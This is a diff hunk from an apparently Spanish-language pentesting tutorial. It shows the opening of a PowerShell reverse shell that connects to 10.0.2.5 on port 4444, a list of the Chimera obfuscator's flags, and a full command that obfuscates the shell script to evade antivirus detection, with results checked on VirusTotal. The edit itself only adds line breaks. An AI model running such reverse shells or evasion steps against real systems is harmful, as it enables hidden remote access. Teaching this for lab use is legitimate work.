@@ -200,16 +200,17 @@ $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $cl
 
 Para ofuscarlo debemos ejectar el siguinete comando e ir probando el resultado en [VirusTotal](https://www.virustotal.com/gui/home/upload), mirando los detalles alertan las siguientes funciones: new-object y out-string. Mirando la ayuda esto es lo que podemos hacer con chimera:
 
--f: Archivo de entrada.
--o: Archivo de salida.
--v: Substituir nombres de variables.
--t: Substuir tipos de datos.
--j: Substituir nombres de funciones.
--i: Insertar comentarios arbitrarios.
--c: Replazar comentarios con datos arbitrarios.
--h: Convertir direcciones IP addresses a hexadecimal.
--s: Substitute various strings.
--b: Marcado de palabras (importante).
+-f: Archivo de entrada.<br>
+-o: Archivo de salida.<br>
+-v: Substituir nombres de variables.<br>
+-t: Substuir tipos de datos.<br>
+-j: Substituir nombres de funciones.<br>
+-i: Insertar comentarios arbitrarios.<br>
+-c: Replazar comentarios con datos arbitrarios.<br>
+-h: Convertir direcciones IP addresses a hexadecimal.<br>
+-s: Substitute various strings.<br>
+-b: Marcado de palabras (importante).<br>
+Quedando de esta manera:
 
 ```bash
 /opt/chimera.sh -f /opt/shells/powershell_reverse_shell.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -b new-object,out-string
